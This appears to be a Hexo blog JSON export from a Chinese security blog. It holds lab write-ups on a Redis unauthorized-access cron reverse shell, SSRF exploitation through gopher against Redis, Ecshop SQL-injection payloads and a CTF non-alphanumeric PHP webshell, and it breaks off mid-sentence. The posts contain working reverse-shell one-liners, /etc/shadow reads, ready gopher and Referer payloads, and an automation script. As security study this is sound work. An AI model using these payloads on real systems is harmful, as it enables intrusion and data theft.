{"meta":{"title":"Climber","subtitle":"原创文章，未经授权请勿转载","description":"信息安全技术博客","author":"Climber","url":"http://yoursite.com"},"pages":[{"title":"分类","date":"2017-11-03T10:05:16.000Z","updated":"2018-02-27T14:32:56.399Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2017-11-03T10:01:21.000Z","updated":"2018-02-27T14:32:36.264Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现","date":"2018-08-18T17:15:55.024Z","updated":"2018-08-18T17:15:55.024Z","comments":true,"path":"redis.html","permalink":"http://yoursite.com/redis.html","excerpt":"","text":"记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu任务计划写shell失败的问题和关于ubuntu和centos cron的一些区别这两篇文章 漏洞环境及搭建ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用 该实验中redis的版本为4.0.8，安装redis方法如下 1234wget http://download.redis.io/releases/redis-4.0.8.tar.gztar –xvf redis-4.0.8.tar.gzcd redis-4.0.8make ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方 1.bind 127.0.0.1前面需要加上注释符 2.protected-mode要修改为no 尝试利用linux任务计划文件去反弹shell首先在ubuntu上开启redis服务 12cd redis-4.0.8./src/redis-server redis.conf 由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell 12cd redis-4.0.8./src/redis-cli -h 192.168.0.107 -p 6379 现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。 首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式 1cat /etc/crontab 里面的参数和一些符号含义如下 m:分钟 - 从0到59的整数 h:小时 - 从0到23的整数 dom:天 - 从1到31的整数 (必须是指定月份的有效日期) mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示) user:指的是执行命令的用户 command: 需要执行的命令 星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次 符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 ubuntu下可以利用的cron有以下几个地方 /etc/crontab：该文件里面的任务计划可以直接执行 /etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况 /var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600 知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的/etc/cron.d目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为* * * * * root ln -s -f bash /bin/sh，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在/etc/cron.d目录下创建一个任务计划文件step2，内容为* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777,也就是使用交互式的bash去反弹shell到kali 1nc -nvlp 7777 接下来在redis-cli命令行输入 12345678set aaa \"\\n\\n\\n\\n* * * * * root ln -s -f bash /bin/sh\\n\\n\\n\\n\"config set dir /etc/cron.dconfig set dbfilename step1saveset bbb \"\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\\n\\n\\n\\n\"config set dir /etc/cron.dconfig set dbfilename step2save 这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，\\n这个符号前后分别不能小于2个，否则文件内容会出现乱码导致命令执行失败，这是其中一个坑,可以看到/etc/cron.d目录下分别成功创建了一个名为step1和step2的任务计划文件 文件内容分别为 但是shell还是反弹失败了，/bin/sh的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是ERROR (Syntax error, this crontab file will be ignored) 这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码 对于这一次失败的总结和看法对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron以及一些其它的安全机制有了更深的认识，所以，这一切都是值得的"},{"title":"ssrf漏洞原理以及利用方法","date":"2018-08-26T01:29:40.189Z","updated":"2018-08-26T01:22:00.751Z","comments":true,"path":"ssrf.html","permalink":"http://yoursite.com/ssrf.html","excerpt":"ssrf漏洞原理以及利用方法ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip","text":"ssrf漏洞原理以及利用方法ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip ssrf中一些可以利用的curl协议ssrf的利用方式取决于服务器所支持的curl协议，之前自己为了做该实验升级了curl的版本为最新版本，目前Centos6的curl版本为7.61.0,查看一下其支持的协议首先使用curl本地测试一些ssrf的攻击方法 利用file协议读取服务器的文件：1curl -v \"file:///etc/shadow\" 权限比较大的话，直接读取系统影子文件,不过这种情况也只是在本地测试中以root用户运行curl时才会存在利用dict协议去进行服务版本探测：1curl -v \"dict://127.0.0.1:22/info 进行ssh服务的版本探测 利用gopher协议扩大攻击面，攻击本地或者内网的一些脆弱的地方 举个栗子：比如redis数据库的默认配置允许可以直接在本地无需密码直接访问数据库，通过redis未授权访问漏洞可以通过在本地访问数据库，执行数据库语句，以利于redis未授权访问漏洞结合linux cron反弹shell为例 首先先写一个可以自动利用的shell脚本 1vi rediscron.sh 12345echo -e \"\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\\n\\n\" | redis-cli -h $1 -p $2 -x set aaaredis-cli -h $1 -p $2 config set dir /var/spool/cronredis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 1chmod +x rediscron.sh 之后执行脚本: 1./rediscron.sh 127.0.0.1 6379 此时redis数据库的配置为没有修改的默认配置，我们可以通过本地访问redis去利用未授权访问漏洞反弹shell，可以看到执行脚本后成功在/var/spool/cron下创建了一个反弹shell的任务计划文件 现在有一个问题就是如何将其转化为gopher协议的格式去利用，这里要利用到socat这个工具,去socat官网下载 123456wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gztar -zxvf socat-1.7.3.2.tar.gzcd socat-1.7.3.2./configuremakemake install 之后使用socat作为中间人代理抓取流量 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 这条命令的意思相当于是发往6379端口的数据会先经过本地的4444端口，相当于做了一个代理去抓包，可以理解为burpsuite抓包的原理 之后再次执行1./rediscron.sh 127.0.0.1 4444 可以看到socat抓到了redis攻击的数据流量,具体内容如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&gt; 2018/08/25 01:51:28.003621 length=87 from=0 to=86*3\\r$3\\rset\\r$3\\raaa\\r$58\\r* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\\r&lt; 2018/08/25 01:51:28.003804 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.007530 length=56 from=0 to=55*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$15\\r/var/spool/cron\\r&lt; 2018/08/25 01:51:28.007715 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.012076 length=52 from=0 to=51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2018/08/25 01:51:28.012204 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.021196 length=14 from=0 to=13*1\\r$4\\rsave\\r&lt; 2018/08/25 01:51:28.023025 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.026348 length=14 from=0 to=13*1\\r$4\\rquit\\r&lt; 2018/08/25 01:51:28.026530 length=5 from=0 to=4+OK\\r 现在需要的就是将抓取到的redis攻击流量转化为gopher协议支持的格式，这里有一个转化规则 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a 空白行替换为%0a 这里直接使用三叶草joychou师傅写的转化脚本tran2gopher.py 123456789101112131415161718192021222324252627#coding: utf-8#author: JoyChouimport sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] == r'\\r': # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\\r', '%0d%0a') # 去掉最后的换行符 line = line.replace('\\n', '') exp = exp + line # 判断是否是空行，空行替换为%0a elif line == '\\x0a': exp = exp + '%0a' else: line = line.replace('\\n', '') exp = exp + lineprint exp 1python tran2gopher.py redis.log 其中redis.log为刚刚抓取到的redis攻击流量经过转化后内容如下 1*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a 在本地使用curl的gopher协议测试一下1curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a' 之后可以看到利用gpoher协议成功向任务计划目录下写了一个反弹shell的任务计划成功反弹shell ssrf漏洞实例存在ssrf漏洞的代码ssrf.php如下 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;ssrf漏洞实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\"&gt; input:&lt;input type=\"text\" name=\"url\" value=\"\"/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"get\"&gt; &lt;?php if(isset($_GET['url'])&amp;&amp;isset($_GET['submit'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); &#125; ?&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 漏洞场景：web应用实现了从其他服务器获取资源的功能，由于对url过滤不严而产生ssrf漏洞1http://192.168.0.103/ssrf.php?url=http%3A%2F%2Fwww.4o4notfound.org%2Findex.php%2Farchives%2F33%2F&amp;submit=get 首先查看php-curl扩展所支持的curl协议使用dict协议对本地服务进行探测,探测ssh服务版本payload:1http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A22%2Finfo&amp;submit=get 探测redis服务版本payload:1http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo&amp;submit=get 使用file协议读取服务器文件payload：1http://192.168.0.103/ssrf.php?url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;submit=get 使用gopher协议攻击本地redis反弹shell payload：1http://192.168.0.103/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250aaaa%250d%250a%2458%250d%250a%250a%250a*+*+*+*+*+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.109%2F7777+0%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2Fvar%2Fspool%2Fcron%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a&amp;submit=get 可以看到成功通过gopher协议攻击了本地的redis服务，向任务计划目录下写了一个反弹shell的cron文件在kali上成功反弹到了shell"},{"title":"Ecshop2.x&3.x最新漏洞分析与利用","date":"2018-10-09T07:26:16.068Z","updated":"2018-10-09T07:26:16.068Z","comments":true,"path":"Ecshop2.x & 3.x版本最新漏洞分析与利用.html","permalink":"http://yoursite.com/Ecshop2.x & 3.x版本最新漏洞分析与利用.html","excerpt":"Ecshop2.x &amp; 3.x版本最新注入与代码执行漏洞分析与利用序在九月份初左右爆出了一个有关Ecshop全版本的通杀漏洞，据说攻击者之前使用该漏洞的payload去攻击了某区块链交易所网站。该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，然后到了9月份漏洞的详情和攻击payload才公开出来，期间应该有不少应用都受到了该漏洞的影响。刚好自己正在学习代码审计，于是自己通过一些资料和网上现有的payload去研究了一波","text":"Ecshop2.x &amp; 3.x版本最新注入与代码执行漏洞分析与利用序在九月份初左右爆出了一个有关Ecshop全版本的通杀漏洞，据说攻击者之前使用该漏洞的payload去攻击了某区块链交易所网站。该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，然后到了9月份漏洞的详情和攻击payload才公开出来，期间应该有不少应用都受到了该漏洞的影响。刚好自己正在学习代码审计，于是自己通过一些资料和网上现有的payload去研究了一波 漏洞环境本篇文章分别使用Ecshop2.7.4和Ecshop3.x这两个版本去分析利用该漏洞，web应用搭建到了windows2008 server上面 辅助工具Seay源代码审计系统 漏洞详情简单的来说，这次的漏洞本质上其实是一个sql注入漏洞，然后通过sql注入而产生的远程代码执行漏洞，下面将开始通过捕获到的payload去一步步的分析还原该漏洞的发现过程，这里分析的版本为Ecshop2.4.7 漏洞分析在分析漏洞之前首先来看其中的一个payload 访问:http://site/user.php?act=login 然后在http请求头里面添加： Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;} 由攻击的payload可以判断漏洞的起点位置在user.php这个文件内，通过act=login关键字定位到相关的代码位置 123456789101112131415161718192021222324252627/* 用户登录界面 */elseif ($action == 'login')&#123; if (empty($back_act)) &#123; if (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER'])) &#123; $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER']; &#125; else &#123; $back_act = 'user.php'; &#125; &#125; $captcha = intval($_CFG['captcha']); if (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION['login_fail'] &gt; 2)) &amp;&amp; gd_version() &gt; 0) &#123; $GLOBALS['smarty']-&gt;assign('enabled_captcha', 1); $GLOBALS['smarty']-&gt;assign('rand', mt_rand()); &#125; $smarty-&gt;assign('back_act', $back_act); $smarty-&gt;display('user_passport.dwt');&#125; 可以看到我们在数据包里添加的payload，也就是http请求头当中Referer的value值被$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]这个服务器全局变量接收到，之后赋值给了$back_act变量，接着$back_act这个变量作为参数传入到了$smarty对象（来自cls_template这个类）的assign方法内,下面通过Seay源代码审计工具定位到assign这个函数的位置，位于include/cls_template.php这个文件内，代码如下 1234567891011121314151617181920212223242526272829/** * 注册变量 * * @access public * @param mix $tpl_var * @param mix $value * * @return void */function assign($tpl_var, $value = '')&#123; if (is_array($tpl_var)) &#123; foreach ($tpl_var AS $key =&gt; $val) &#123; if ($key != '') &#123; $this-&gt;_var[$key] = $val; &#125; &#125; &#125; else &#123; if ($tpl_var != '') &#123; $this-&gt;_var[$tpl_var] = $value; &#125; &#125;&#125; 可以看到该函数将传入的参数$back_act变量的值赋值给了$smarty对象的$_var[&#39;back_act&#39;]这个属性变量,接着再回到user.php，下面$smarty对象又调用了自身display方法，传入的参数是user_passport.dwt这个模板文件 于是再次定位到include/cls_template.php这个文件当中display函数代码的相关位置，代码如下 12345678910111213141516171819202122232425262728293031323334/** * 显示页面函数 * * @access public * @param string $filename * @param sting $cache_id * * @return void */function display($filename, $cache_id = '')&#123; $this-&gt;_seterror++; error_reporting(E_ALL ^ E_NOTICE); $this-&gt;_checkfile = false; $out = $this-&gt;fetch($filename, $cache_id); if (strpos($out, $this-&gt;_echash) !== false) &#123; $k = explode($this-&gt;_echash, $out); foreach ($k AS $key =&gt; $val) &#123; if (($key % 2) == 1) &#123; $k[$key] = $this-&gt;insert_mod($val); &#125; &#125; $out = implode('', $k); &#125; error_reporting($this-&gt;_errorlevel); $this-&gt;_seterror--; echo $out;&#125; 可以看到display函数里调用了$smarty这个类的fetch方法，传入的参数就是之前传入的模板文件user_passport.dwt，关于fetch这个函数比较复杂，自己还没有分析的太明白，目前只知道这个函数会对传入的模板文件user_passport.dwt进行处理，fetch函数里面会调用该对象的make_compiled方法对传入的模板文件进行编译，模板文件user_passport.dwt的部分代码如下make_compiled函数会对模板文件user_passport.dwt中的$back_act变量进行解析，而这个变量的值正是之前通过assign方法传入的变量$back_act，也就是payload的内容，make_comoiled函数解析模板所返回的html内容会被赋值给$out变量，之后该变量做为fetch函数的返回值返回出去，fetch函数的代码如下，位于include/cls_template.php文件当中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990/** * 处理模板文件 * * @access public * @param string $filename * @param sting $cache_id * * @return sring */function fetch($filename, $cache_id = '')&#123; if (!$this-&gt;_seterror) &#123; error_reporting(E_ALL ^ E_NOTICE); &#125; $this-&gt;_seterror++; if (strncmp($filename,'str:', 4) == 0) &#123; $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); &#125; else &#123; if ($this-&gt;_checkfile) &#123; if (!file_exists($filename)) &#123; $filename = $this-&gt;template_dir . '/' . $filename; &#125; &#125; else &#123; $filename = $this-&gt;template_dir . '/' . $filename; &#125; if ($this-&gt;direct_output) &#123; $this-&gt;_current_file = $filename; $out = $this-&gt;_eval($this-&gt;fetch_str(file_get_contents($filename))); &#125; else &#123; if ($cache_id &amp;&amp; $this-&gt;caching) &#123; $out = $this-&gt;template_out; &#125; else &#123; if (!in_array($filename, $this-&gt;template)) &#123; $this-&gt;template[] = $filename; &#125; $out = $this-&gt;make_compiled($filename); if ($cache_id) &#123; $cachename = basename($filename, strrchr($filename, '.')) . '_' . $cache_id; $data = serialize(array('template' =&gt; $this-&gt;template, 'expires' =&gt; $this-&gt;_nowtime + $this-&gt;cache_lifetime, 'maketime' =&gt; $this-&gt;_nowtime)); $out = str_replace(\"\\r\", '', $out); while (strpos($out, \"\\n\\n\") !== false) &#123; $out = str_replace(\"\\n\\n\", \"\\n\", $out); &#125; $hash_dir = $this-&gt;cache_dir . '/' . substr(md5($cachename), 0, 1); if (!is_dir($hash_dir)) &#123; mkdir($hash_dir); &#125; if (file_put_contents($hash_dir . '/' . $cachename . '.php', '&lt;?php exit;?&gt;' . $data . $out, LOCK_EX) === false) &#123; trigger_error('can\\'t write:' . $hash_dir . '/' . $cachename . '.php'); &#125; $this-&gt;template = array(); &#125; &#125; &#125; &#125; $this-&gt;_seterror--; if (!$this-&gt;_seterror) &#123; error_reporting($this-&gt;_errorlevel); &#125; return $out; // 返回html数据&#125; 之后display函数对fetch函数返回的带有payload内容的$out变量进行处理，首先判断$out变量中是否存在该对象的_echash属性值，如果存在，则使用explode这个字符分割函数进行处理，使用该对象的_echash属性值作为分割值对$out变量内容进行分割，返回一个索引数组，将索引值为奇数的数组值传入该对象的insert_mod方法，_echash的值如下，和之前payload里面的那串hash值相同，这也是为什么网上所有的payload里面都要有这个hash值的原因之后payload就被当作参数传进了该对象的insert_mode这个方法内，继续跟进insert_mode这个函数代码12345678function insert_mod($name) // 处理动态内容&#123; list($fun, $para) = explode('|', $name); $para = unserialize($para); $fun = 'insert_' . $fun; return $fun($para);&#125; 根据之前的过程可以得出，此时传入的内容为ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}+其它代码，之后使用expload函数以|为分割符将传入的内容分为两部分，第一部分为ads，与insert_拼接后做为该函数的回调函数insert_ads,第二部为a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}+其它代码，接着使用unserialize函数对第二部分进行反序列化处理，由于反序列化函数的特性，一个含有php序列化格式的字符串经过反序列化函数时，unserialize函数会忽略那些不符合php序列化格式的部分，所以在这里将会返回一个数组之后这个数组会被当作回调函数insert_ads的参数，接下来定位到insert_ads这个函数的位置，函数位于/includes/lib_insert.php这个文件内，函数重要的代码部分如下1234567891011121314151617function insert_ads($arr)&#123; static $static_res = NULL; $time = gmtime(); if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \". \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; $res = $GLOBALS['db']-&gt;GetAll($sql); &#125;...后面的代码忽略 可以看到将数组的值直接拼接到了sql语句中，所以到这已经成功定位到了注入漏洞的位置，在这里可以注入的位置有两个，分别是$arr[&#39;id&#39;]的位置和$arr[&#39;num&#39;]的位置，由于注入点的不同，构造payload的方式也不同，通过之前的一步步分析，payload的构造格式也很清楚了，需要写成echash+ads+序列化处理后的关联数组(里面的键值为注入的payload)，下面来构造payload 首先是$arr[&#39;id&#39;]这个位置，关于这个位置无需多说，使用正常的报错注入方法就行，构造payload1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:4:\"name\";i:1;s:2:\"id\";s:49:\"' and extractvalue(1,concat(0x3a,user(),0x3a))-- \";&#125; 可以看到成功报错出了数据库的信息 接下来是$arr[&#39;num&#39;]这个位置的注入，这个位置的注入比较特殊，因为它在limit的后面，因为mysql的语法规则，在limit后面只能使用procedure analyse这个函数去进行报错注入，并且有很多的局限性，以后自己会单独写一篇文章总结，下面先来简单说一下有关这个函数的使用 1.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错 2.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据 3.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep 报错注入利用时间盲注利用构造payload1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\"num\";s:63:\"0,1 procedure analyse(extractvalue(1,concat(0x3a,user())),1)-- \";s:2:\"id\";i:1;&#125;"}],"posts":[{"title":"记一次ctf极限利用-不包含数字字母的webshell","slug":"记一次ctf极限利用-不包含数字字母的webshell","date":"2018-10-08T03:22:03.313Z","updated":"2018-10-09T06:36:47.476Z","comments":true,"path":"2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/","link":"","permalink":"http://yoursite.com/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/","excerpt":"#记一次ctf极限利用-不包含数字字母的webshell# 序问题来自于同事给我一道安恒的ctf赛题，题目代码如下12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = \"php function getFlag() to get flag\";?&gt;","text":"#记一次ctf极限利用-不包含数字字母的webshell# 序问题来自于同事给我一道安恒的ctf赛题，题目代码如下12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = \"php function getFlag() to get flag\";?&gt; 看到这个题目后我的最先思路是想办法去执行getFlag这个函数去得到flag，于是想到可以利用php当中两个字符异或后可以得到另外字符这一个特性，将不为数字字母的字符异或后得到想要的字符,首先将所有可能性打印出来123456789&lt;?php$a=array('!','\"','#','$','%',',','&amp;','\\\\',\"'\",'(',')','.','*','+','-','/','[',']','^','_','`','&#123;','|','&#125;','~',':',';','&lt;','=','&gt;','?','@');foreach ($a as $v1) &#123; foreach ($a as $v2) &#123; $r=$v1^$v2; echo $r.'='.$v1.'^'.$v2; echo \"&lt;/br&gt;\"; &#125;&#125; 经过测试得到： g=&apos;^@ e=[^&gt; t=]^) F=`^&amp; l=@^, a=!^@ g=&apos;^@ &quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;=getFlag 接下来利用php的可变变量特性构造payload $_=&quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;;$_(); 传入后最终变为： eval(getFlag()) 但是这道题的正则也过滤了$和_,导致自己的这个思路受到了一些限制，后来自己又看了一叶飘零师傅的解法，思路是可以利用反引号执行命令将flag文件读取出来，加上利用linux当中?这个通配符就可以达到不使用数字字母与$_就可以获取flag的目的，但是由于?这个通配符是匹配任意字符的，导致结果当中会出现很多垃圾数据，而且我用这个方法得到的结果并不完整，不知道是哪里出了问题 于是自己向p牛小密圈发起了求助，经过p牛和小密圈大佬们的指点，得到了很多思路和有趣的知识点，在这里将自己学到的记录分享一下 首先，需要考虑到php5和php7的一些差异，php7当中已经可以使用(函数名)()这样的格式去执行一些动态函数了，所以这道题如果放到php7环境当中的话，就会比较好解，利用上面所说的那个特性就可以达到执行函数的目的，以执行phpinfo函数为例，构造payload：(&quot;\\(\\@@&amp;/&quot;^&quot;,@,).@@&quot;)();,将payload传入get参数code即可,注意一点，为了避免特殊符号影响，需要将payload进行url编码 如果是php5的话，目前暂时还没有找到不使用数字字母和$_这些符号就可以执行动态函数去读取flag的方法，在这里需要使用执行命令的方法，但是需要避免无关的垃圾数据，经过p牛师傅的指点get到了一个很棒的思路：可以通过构造一个文件上传的数据包，通过文件上传可以在服务器的tmp目录下生成一个上传的php临时文件，文件的内容为要执行的命令，这个临时文件的生命周期就在php代码执行的期间，php代码执行结束就会自动删除，这样的话就可以在上传文件的同时传入GET参数去执行这个临时文件里面的命令，这里包含了几个知识点： 1.有关linux 